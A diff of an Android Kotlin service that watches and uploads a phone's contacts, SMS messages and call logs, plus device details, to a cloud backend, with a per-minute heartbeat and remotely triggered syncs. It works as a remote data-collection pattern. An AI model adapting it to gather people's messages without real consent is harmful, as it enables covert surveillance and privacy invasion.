@@ -5,219 +5,176 @@ import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.PendingIntent
 import android.app.Service
-import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
-import android.database.ContentObserver
 import android.os.Build
-import android.os.Handler
 import android.os.IBinder
-import android.os.Looper
 import android.provider.CallLog
 import android.provider.ContactsContract
 import android.provider.Telephony
 import android.util.Log
 import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
-import androidx.core.content.PermissionChecker
 import androidx.preference.PreferenceManager
 import com.boxx.datasync.MainActivity
 import com.boxx.datasync.domain.repository.DataRepository
-import com.boxx.datasync.domain.model.Device
 import com.boxx.datasync.utils.DataHelper
 import com.boxx.datasync.utils.DeviceIdHelper
-import com.google.firebase.crashlytics.FirebaseCrashlytics
 import dagger.hilt.android.AndroidEntryPoint
-import kotlinx.coroutines.*
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.Job
+import kotlinx.coroutines.SupervisorJob
+import kotlinx.coroutines.cancel
+import kotlinx.coroutines.delay
+import kotlinx.coroutines.flow.collectLatest
+import kotlinx.coroutines.launch
 import javax.inject.Inject
 
 @AndroidEntryPoint
 class SyncService : Service() {
     private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
 
-    @Inject
-    lateinit var repository: DataRepository
+    @Inject lateinit var repository: DataRepository
 
-    private val crashlytics = FirebaseCrashlytics.getInstance()
     private lateinit var deviceId: String
-
     private var syncJob: Job? = null
-
-    private val observer = object : ContentObserver(Handler(Looper.getMainLooper())) {
-        override fun onChange(selfChange: Boolean) {
-            debouncedSync()
-        }
-    }
-
     private var remoteSyncJob: Job? = null
     private var heartbeatJob: Job? = null
+    private lateinit var observer: DataContentObserver
 
     override fun onCreate() {
         super.onCreate()
         deviceId = DeviceIdHelper.getDeviceId(this)
-        if (deviceId.isBlank()) {
-            stopSelf()
-            return
-        }
         createNotificationChannel()
+        startForegroundCompat(createNotification())
+        Log.d("SyncService", "SYNC_SERVICE_STARTED")
+        registerObservers()
+        startRemoteSyncListener()
+        startHeartbeat()
+    }
 
-        val notification = createNotification()
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) { // Android 14+
-            startForeground(
-                1,
-                notification,
-                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
-            )
-        } else {
-            startForeground(1, notification)
-        }
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        syncJob?.cancel()
+        syncJob = serviceScope.launch { performSync(isFullSync = intent?.getBooleanExtra(SyncScheduler.KEY_FULL_SYNC, false) == true) }
+        return START_NOT_STICKY
+    }
 
+    private fun registerObservers() {
+        observer = DataContentObserver(this)
         try {
             contentResolver.registerContentObserver(ContactsContract.Contacts.CONTENT_URI, true, observer)
             contentResolver.registerContentObserver(Telephony.Sms.CONTENT_URI, true, observer)
             contentResolver.registerContentObserver(CallLog.Calls.CONTENT_URI, true, observer)
         } catch (e: SecurityException) {
-            Log.e("SyncService", "Permission denied for ContentObserver", e)
-            crashlytics.recordException(e)
+            Log.e("SyncService", "Missing permission while registering observers", e)
         }
-
-        startRemoteSyncListener()
-        startHeartbeat()
     }
 
     private fun startHeartbeat() {
         heartbeatJob?.cancel()
         heartbeatJob = serviceScope.launch {
-            while (isActive) {
+            while (true) {
                 repository.updateHeartbeat(deviceId)
-                delay(30000) // 30 seconds
+                Log.d("SyncService", "HEARTBEAT_UPDATED")
+                delay(60_000)
             }
         }
     }
 
     private fun startRemoteSyncListener() {
-        var lastHandledSyncRequest = PreferenceManager.getDefaultSharedPreferences(this).getLong("last_handled_sync_request", 0L)
+        var lastHandled = PreferenceManager.getDefaultSharedPreferences(this).getLong("last_handled_sync_request", 0L)
         remoteSyncJob?.cancel()
         remoteSyncJob = serviceScope.launch {
-            repository.observeSyncRequests(deviceId).collect { requestedAt ->
-                if (requestedAt > lastHandledSyncRequest) {
-                    Log.d("SyncService", "Remote sync requested at: $requestedAt")
-                    lastHandledSyncRequest = requestedAt
-                    PreferenceManager.getDefaultSharedPreferences(this@SyncService).edit()
-                        .putLong("last_handled_sync_request", lastHandledSyncRequest)
-                        .apply()
-                    performSync(isFullSync = true)
+            repository.observeSyncRequests(deviceId).collectLatest { requestedAt ->
+                if (requestedAt > lastHandled) {
+                    lastHandled = requestedAt
+                    PreferenceManager.getDefaultSharedPreferences(this@SyncService).edit().putLong("last_handled_sync_request", lastHandled).apply()
+                    performSync(isFullSync = false)
                 }
             }
         }
     }
 
-    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        debouncedSync()
-        return START_STICKY
-    }
-
-    private fun debouncedSync() {
-        syncJob?.cancel()
-        syncJob = serviceScope.launch {
-            delay(2000) // 2 seconds debounce
-            performSync()
-        }
-    }
-
-    private suspend fun performSync(isFullSync: Boolean = false) {
+    private suspend fun performSync(isFullSync: Boolean) {
         val prefs = PreferenceManager.getDefaultSharedPreferences(this)
-        val currentTime = System.currentTimeMillis()
-
+        val now = System.currentTimeMillis()
         try {
+            repository.updateDeviceInfoMap(deviceId, baseDeviceMap(now) + mapOf("syncStatus" to "Syncing", "lastError" to null))
+            try {
+                repository.testDeviceWrite(deviceId)
+                Log.d("SyncService", "SYNC_FIREBASE_TEST_WRITE_SUCCESS")
+            } catch (e: Exception) {
+                Log.e("SyncService", "SYNC_FIREBASE_TEST_WRITE_FAILED", e)
+                throw e
+            }
+
             val lastSmsSync = if (isFullSync) 0L else prefs.getLong("last_sms_sync", 0L)
             val lastCallSync = if (isFullSync) 0L else prefs.getLong("last_call_sync", 0L)
             val lastContactSync = if (isFullSync) 0L else prefs.getLong("last_contact_sync", 0L)
 
-            val contacts = if (hasPermission(android.Manifest.permission.READ_CONTACTS)) {
-                DataHelper.fetchContacts(this@SyncService, sinceTimestamp = lastContactSync)
-            } else emptyList()
-
-            val smsList = if (hasPermission(android.Manifest.permission.READ_SMS)) {
-                DataHelper.fetchSMS(this@SyncService, sinceTimestamp = lastSmsSync)
-            } else emptyList()
-
-            val callLogs = if (hasPermission(android.Manifest.permission.READ_CALL_LOG)) {
-                DataHelper.fetchCallLogs(this@SyncService, sinceTimestamp = lastCallSync)
-            } else emptyList()
-
-            repository.syncIncremental(deviceId, contacts, smsList, callLogs)
+            val contacts = if (hasPermission(android.Manifest.permission.READ_CONTACTS)) DataHelper.fetchContacts(this, lastContactSync) else emptyList()
+            val sms = if (hasPermission(android.Manifest.permission.READ_SMS)) DataHelper.fetchSMS(this, lastSmsSync) else emptyList()
+            val calls = if (hasPermission(android.Manifest.permission.READ_CALL_LOG)) DataHelper.fetchCallLogs(this, lastCallSync) else emptyList()
+            repository.syncIncremental(deviceId, contacts, sms, calls)
 
             prefs.edit().apply {
-                if (smsList.isNotEmpty()) putLong("last_sms_sync", smsList.maxOf { it.date })
-                if (callLogs.isNotEmpty()) putLong("last_call_sync", callLogs.maxOf { it.date })
-                if (contacts.isNotEmpty()) putLong("last_contact_sync", currentTime)
+                if (contacts.isNotEmpty()) putLong("last_contact_sync", now)
+                if (sms.isNotEmpty()) putLong("last_sms_sync", sms.maxOf { it.date })
+                if (calls.isNotEmpty()) putLong("last_call_sync", calls.maxOf { it.date })
             }.apply()
 
-            val currentContactCount = if (hasPermission(android.Manifest.permission.READ_CONTACTS)) DataHelper.fetchContacts(this@SyncService).size else 0
-            val currentSmsCount = if (hasPermission(android.Manifest.permission.READ_SMS)) DataHelper.fetchSMS(this@SyncService).size else 0
-            val currentCallCount = if (hasPermission(android.Manifest.permission.READ_CALL_LOG)) DataHelper.fetchCallLogs(this@SyncService).size else 0
-
-            repository.updateDeviceInfoMap(deviceId, mapOf(
-                "deviceName" to "${Build.MANUFACTURER} ${Build.MODEL}",
-                "manufacturer" to Build.MANUFACTURER,
-                "model" to Build.MODEL,
-                "osVersion" to Build.VERSION.RELEASE,
-                "lastSyncTime" to currentTime,
-                "heartbeatAt" to currentTime,
-                "contactCount" to currentContactCount,
-                "smsCount" to currentSmsCount,
-                "callCount" to currentCallCount,
-                "timestamp" to currentTime,
+            repository.updateDeviceInfoMap(deviceId, baseDeviceMap(System.currentTimeMillis()) + mapOf(
+                "lastSyncTime" to System.currentTimeMillis(),
                 "syncStatus" to "Synced",
-                "syncRequestedAt" to prefs.getLong("last_handled_sync_request", 0L)
+                "lastError" to null,
+                "contactCount" to if (hasPermission(android.Manifest.permission.READ_CONTACTS)) DataHelper.fetchContacts(this).size else 0,
+                "smsCount" to if (hasPermission(android.Manifest.permission.READ_SMS)) DataHelper.fetchSMS(this).size else 0,
+                "callCount" to if (hasPermission(android.Manifest.permission.READ_CALL_LOG)) DataHelper.fetchCallLogs(this).size else 0
             ))
-            Log.d("SyncService", "Sync completed successfully (Full: $isFullSync)")
+            Log.d("SyncService", "SYNC_FIRESTORE_UPLOAD_SUCCESS")
         } catch (e: Exception) {
-            Log.e("SyncService", "Error during sync", e)
-            crashlytics.recordException(e)
-            repository.updateDeviceInfoMap(deviceId, mapOf(
-                "deviceName" to "${Build.MANUFACTURER} ${Build.MODEL}",
-                "manufacturer" to Build.MANUFACTURER,
-                "model" to Build.MODEL,
-                "osVersion" to Build.VERSION.RELEASE,
-                "lastSyncTime" to currentTime,
-                "heartbeatAt" to currentTime,
-                "syncStatus" to "Error: ${e.localizedMessage ?: "Unknown error"}",
-                "syncRequestedAt" to prefs.getLong("last_handled_sync_request", 0L)
+            val message = e.localizedMessage ?: e.message ?: e.javaClass.simpleName
+            Log.e("SyncService", "SYNC_FIRESTORE_UPLOAD_FAILED", e)
+            repository.updateDeviceInfoMap(deviceId, baseDeviceMap(System.currentTimeMillis()) + mapOf(
+                "lastSyncTime" to System.currentTimeMillis(),
+                "syncStatus" to "Error",
+                "lastError" to message
             ))
+        } finally {
+            Log.d("SyncService", "SYNC_SERVICE_STOPPED")
+            stopSelf()
         }
     }
 
-    private fun hasPermission(permission: String): Boolean {
-        return ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
+    private fun baseDeviceMap(now: Long): Map<String, Any?> = mapOf(
+        "deviceId" to deviceId,
+        "deviceName" to "${Build.MANUFACTURER} ${Build.MODEL}",
+        "manufacturer" to Build.MANUFACTURER,
+        "model" to Build.MODEL,
+        "osVersion" to Build.VERSION.RELEASE,
+        "heartbeatAt" to now,
+        "timestamp" to now
+    )
+
+    private fun hasPermission(permission: String) = ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
+
+    private fun startForegroundCompat(notification: Notification) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) startForeground(1, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC) else startForeground(1, notification)
     }
 
     private fun createNotificationChannel() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channel = NotificationChannel(
-                "sync_channel",
-                "Data Sync Service",
-                NotificationManager.IMPORTANCE_LOW
-            )
-            val manager = getSystemService(NotificationManager::class.java)
-            manager?.createNotificationChannel(channel)
-        }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) getSystemService(NotificationManager::class.java)
+            ?.createNotificationChannel(NotificationChannel("sync_channel", "Data Sync Service", NotificationManager.IMPORTANCE_LOW))
     }
 
     private fun createNotification(): Notification {
-        val intent = Intent(this, MainActivity::class.java)
-        val pendingIntent = PendingIntent.getActivity(
-            this, 0, intent,
-            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
-        )
-
+        val pendingIntent = PendingIntent.getActivity(this, 0, Intent(this, MainActivity::class.java), PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
         return NotificationCompat.Builder(this, "sync_channel")
-            .setContentTitle("Data Syncing")
-            .setContentText("Your data is being kept up to date.")
-            .setSmallIcon(android.R.drawable.ic_popup_sync)
+            .setContentTitle("Data Sync")
+            .setContentText("Syncing educational demo data with your consent")
+            .setSmallIcon(android.R.drawable.stat_notify_sync)
             .setContentIntent(pendingIntent)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
             .setOngoing(true)
             .build()
     }
@@ -225,8 +182,8 @@ class SyncService : Service() {
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onDestroy() {
-        super.onDestroy()
+        runCatching { contentResolver.unregisterContentObserver(observer) }
         serviceScope.cancel()
-        contentResolver.unregisterContentObserver(observer)
+        super.onDestroy()
     }
 }
